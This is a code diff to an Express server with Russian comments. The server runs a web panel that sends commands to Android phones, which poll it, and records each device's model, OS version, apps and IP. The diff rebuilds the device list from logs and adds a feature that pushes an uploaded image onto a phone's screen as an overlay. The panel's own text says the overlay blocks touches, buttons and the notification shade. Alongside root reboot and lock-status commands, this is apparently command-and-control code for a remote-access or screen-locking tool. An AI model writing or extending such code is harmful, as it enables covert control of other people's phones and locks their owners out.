@@ -104,6 +104,30 @@ function soundNames() {
   }
 }
 
+// ── картинки на экран телефона ─────────────────────────────────────────────
+const IMG_EXT = ['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp'];
+
+function isImageName(name) {
+  return IMG_EXT.includes(path.extname(String(name) || '').toLowerCase());
+}
+
+/** Файлы в media/, которые можно вывести на экран. Свежие сверху. */
+function imageFiles() {
+  return cached('images', 3000, () => {
+    try {
+      return fs.readdirSync(MEDIA_DIR)
+        .filter(isImageName)
+        .map(f => {
+          const st = fs.statSync(path.join(MEDIA_DIR, f));
+          return { name: f, size: st.size, ts: st.mtimeMs };
+        })
+        .sort((a, b) => b.ts - a.ts);
+    } catch (e) {
+      return [];
+    }
+  });
+}
+
 const mediaStorage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, MEDIA_DIR),
   filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
@@ -147,6 +171,73 @@ function writeUploadLogs(arr) {
 }
 function readDevices() { return cached('devices', 2000, () => readJSON(DEVICES_FILE, {})); }
 function writeDevices(o) { writeJSON(DEVICES_FILE, o); bust('devices'); }
+
+/**
+ * Список устройств для панели.
+ *
+ * На бесплатном Render диск эфемерный: контейнер уснул/передеплоился —
+ * devices.json пустой, и панель показывает «устройств нет», хотя телефон
+ * жив и стучится. Поэтому недостающие устройства восстанавливаем из логов
+ * (там deviceId и время последнего ответа остаются). Телефон, который
+ * сейчас на связи, всё равно перезапишет запись свежим /ping.
+ */
+function deviceRegistry() {
+  const devices = readDevices();
+  try {
+    const logs = readJSON(LOG_FILE, []);
+    const known = new Set(Object.keys(devices));
+    for (const e of logs) {
+      const id = e && e.deviceId;
+      if (!id || known.has(id)) continue;
+      known.add(id);
+      devices[id] = {
+        deviceId: id,
+        device: e.device || '?',
+        android: e.android || '?',
+        sdk: e.sdk || '?',
+        clients: Array.isArray(e.clients) ? e.clients : [],
+        ip: e.ip || '?',
+        lastSeen: e.ts || 0,
+        restored: true
+      };
+    }
+  } catch (e) {}
+  try {
+    const uplogs = readJSON(UPLOAD_LOG_FILE, []);
+    for (const e of uplogs) {
+      const id = e && e.deviceId;
+      if (!id || known.has(id)) continue;
+      known.add(id);
+      devices[id] = {
+        deviceId: id, device: e.device || '?', android: e.android || '?',
+        sdk: e.sdk || '?', clients: [], ip: e.ip || '?',
+        lastSeen: e.ts || 0, restored: true
+      };
+    }
+  } catch (e) {}
+  return devices;
+}
+
+/** Отметить устройство живым без полного /ping (его шлёт поллер и результаты). */
+function touchDevice(deviceId, req, data) {
+  if (!deviceId) return;
+  try {
+    const devices = readDevices();
+    const prev = devices[deviceId] || {};
+    const d = data || {};
+    devices[deviceId] = {
+      ...prev,
+      deviceId,
+      device: d.device || prev.device || '?',
+      android: d.android || prev.android || '?',
+      sdk: d.sdk || prev.sdk || '?',
+      clients: prev.clients || [],
+      ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress) || prev.ip || '?',
+      lastSeen: Date.now()
+    };
+    writeDevices(devices);
+  } catch (e) {}
+}
 function readCmds() { return readJSON(CMDS_FILE, {}); }
 function writeCmds(o) { writeJSON(CMDS_FILE, o); }
 
@@ -406,6 +497,9 @@ app.post('/cmd/poll', (req, res) => {
   const wait = Math.min(25, Math.max(0, Number(body.wait) || 0));
 
   const cmd = takeCommand(deviceId);
+  // поллер стучится каждые 20 с — это самый частый признак жизни,
+  // по нему устройство возвращается на панель даже после сброса данных
+  touchDevice(deviceId, req);
   if (cmd) return res.json({ ok: true, cmd });
   if (!wait) return res.json({ ok: true, cmd: null });
 
@@ -427,6 +521,9 @@ app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
   const deviceId = req.headers['x-device-id'] || 'unknown';
   const cmdType = req.headers['x-cmd-type'] || '?';
   const status = req.headers['x-status'] || '?';
+
+  // ответ на команду — тоже признак жизни
+  touchDevice(deviceId, req);
 
   let note = '';
   try {
@@ -763,7 +860,7 @@ app.get('/api/state', (req, res) => {
   const files = loadFiles();
   const logs = cached('logs', 2000, () => readJSON(LOG_FILE, []).slice().reverse());
   const uploadLogs = cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, []).slice().reverse());
-  const devices = readDevices();
+  const devices = deviceRegistry();
   const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
   const online = d => (Date.now() - d.lastSeen) < 60000;
   const ipOf = ip => S.hideIp ? '•••' : esc(ip);
@@ -800,7 +897,7 @@ app.get('/', (req, res) => {
 
   const logs = cached('logs', 2000, () => readJSON(LOG_FILE, []).slice().reverse());
   const uploadLogs = cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, []).slice().reverse());
-  const devices = readDevices();
+  const devices = deviceRegistry();
   const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
   const onlineCount = deviceList.filter(d => (Date.now() - d.lastSeen) < 60000).length;
   const totalSize = files.reduce((s, f) => s + f.size, 0);
@@ -904,7 +1001,7 @@ app.get('/', (req, res) => {
       </a>`).join('');
 
     controlHtml = deviceList.length === 0
-      ? `<div class="empty">${icon('control', 'empty-ico')}<h3>Устройств пока нет</h3><p>Устройство появится здесь после первого запроса к <code>/log</code></p></div>`
+      ? `<div class="empty">${icon('control', 'empty-ico')}<h3>Устройств пока нет</h3><p>Телефон должен быть включён, приложение запущено и иметь интернет. Панель узнаёт устройство по запросу <code>/ping</code> (раз в 30 с), так что оно появится здесь в течение минуты.</p><p class="faint">Если панель лежит на бесплатном Render — она засыпает, и список устройств обнуляется при перезапуске. Телефон вернёт себя сам, как только снова выйдет на связь.</p></div>`
       : `<div class="dev-grid">${cards}</div>`;
   } else {
     const dev = devices[selectedDevice];
@@ -938,6 +1035,37 @@ app.get('/', (req, res) => {
           <a class="cmd-card" href="/cmd/send?${q}&cmd=reboot" onclick="return confirm('Перезагрузить устройство? Нужен root. Блокировка экрана снимется')">${icon('power')}<span>Перезагрузка</span><small>reboot</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=lockstatus">${icon('logs')}<span>Статус лока</span><small>lockstatus</small></a>
         </div>
+
+        ${(() => {
+          const imgs = imageFiles();
+          const cells = imgs.length
+            ? imgs.map(i => `
+              <div class="img-cell">
+                <img src="/media/${encodeURIComponent(i.name)}" alt="" loading="lazy">
+                <div class="img-meta mono" title="${esc(i.name)}">${esc(i.name.replace(/^\d+_/, ''))}</div>
+                <div class="img-actions">
+                  <a class="btn btn-sm" href="/cmd/send?${q}&cmd=image&name=${encodeURIComponent(i.name)}">На экран</a>
+                  <a class="btn btn-ghost btn-sm btn-danger" href="/images/delete/${encodeURIComponent(i.name)}?key=${k}&device=${encodeURIComponent(selectedDevice)}" onclick="return confirm('Удалить картинку с сервера?')">×</a>
+                </div>
+              </div>`).join('')
+            : '<div class="empty sm">картинок пока нет</div>';
+
+          return `
+          <section class="panel img-panel">
+            <header class="panel-head"><h2>Картинка на экран</h2><span class="panel-hint">${imgs.length}</span></header>
+            <form class="img-upload" method="post" action="/images/upload" enctype="multipart/form-data">
+              <input type="hidden" name="key" value="${k}">
+              <input type="hidden" name="device" value="${esc(selectedDevice)}">
+              <input type="file" name="file" accept="image/*" required>
+              <button class="btn btn-sm" type="submit">Загрузить</button>
+            </form>
+            <div class="img-grid">${cells}</div>
+            <div class="panel-foot">
+              <span class="hint">Картинка висит поверх всего: тачи съедаются, кнопки и шторка не работают. Снять — кнопкой ниже или перезагрузкой.</span>
+              <a class="btn btn-ghost btn-sm btn-danger" href="/cmd/send?${q}&cmd=imagehide">Убрать с экрана</a>
+            </div>
+          </section>`;
+        })()}
 
         ${(() => {
           const pend = readCmds()[selectedDevice] || [];
@@ -1542,6 +1670,21 @@ td.right .btn+.btn{margin-left:6px}
 .cmd-card:hover{border-color:var(--accent);background:var(--hover);transform:translateY(-2px)}
 .cmd-card:hover .ico{color:var(--accent)}
 
+/* ── картинка на экран ── */
+.img-panel{margin-bottom:16px}
+.img-upload{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:0 0 14px}
+.img-upload input[type=file]{
+  flex:1;min-width:200px;font-size:12px;color:var(--fg-3);padding:7px 10px;
+  border:1px solid var(--line);border-radius:9px;background:var(--panel-2,var(--panel));
+}
+.img-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(148px,1fr));gap:10px}
+.img-cell{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--panel)}
+.img-cell img{display:block;width:100%;height:104px;object-fit:cover;background:#000}
+.img-meta{padding:6px 8px;font-size:10.5px;color:var(--fg-3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.img-actions{display:flex;gap:6px;padding:0 8px 8px}
+.panel-foot{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between;margin-top:14px}
+.empty.sm{padding:14px;font-size:12px}
+
 /* ── settings ── */
 .settings{max-width:860px}
 .block-title{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);font-weight:600;margin:0 0 10px}
@@ -2095,6 +2238,52 @@ app.use('/sounds', (req, res, next) => {
   if (!viewOk(req)) return res.status(403).send('forbidden');
   next();
 }, express.static(SOUND_DIR, { maxAge: '7d', immutable: true }));
+
+// ── картинки на экран телефона: загрузка, раздача устройству, удаление ─────
+
+// панель: залить картинку в media/
+app.post('/images/upload', mediaUpload.single('file'), (req, res) => {
+  const deviceId = String((req.body && req.body.device) || '');
+  const back = '/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control' +
+    (deviceId ? '&device=' + encodeURIComponent(deviceId) : '');
+
+  if (!viewOk(req)) return res.status(403).send('forbidden');
+  if (!req.file || !String(req.file.mimetype || '').startsWith('image/')) {
+    if (req.file) { try { fs.unlinkSync(req.file.path); } catch (e) {} }
+    return res.status(400).send('нужна картинка (jpg/png/webp)');
+  }
+  bust('images');
+  res.redirect(back);
+});
+
+// устройство: скачать картинку по ключу загрузки (x-key)
+app.get('/wall/:name', (req, res) => {
+  const key = req.headers['x-key'] || req.query.key;
+  if (key !== UPLOAD_KEY) return res.status(403).send('forbidden');
+
+  const name = path.basename(String(req.params.name || ''));
+  if (!isImageName(name)) return res.status(400).send('bad image');
+
+  const p = path.join(MEDIA_DIR, name);
+  if (!fs.existsSync(p)) return res.status(404).send('not found');
+
+  res.setHeader('Cache-Control', 'no-store');
+  res.sendFile(p);
+});
+
+// панель: удалить картинку из media/
+app.get('/images/delete/:name', (req, res) => {
+  if (!viewOk(req)) return res.status(403).send('forbidden');
+
+  const name = path.basename(String(req.params.name || ''));
+  const deviceId = String(req.query.device || '');
+  if (isImageName(name)) {
+    try { fs.unlinkSync(path.join(MEDIA_DIR, name)); } catch (e) {}
+    bust('images');
+  }
+  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control' +
+    (deviceId ? '&device=' + encodeURIComponent(deviceId) : ''));
+});
 
 app.use('/media', (req, res, next) => {
   // превью и результаты команд отдаём только панели, а не всему интернету
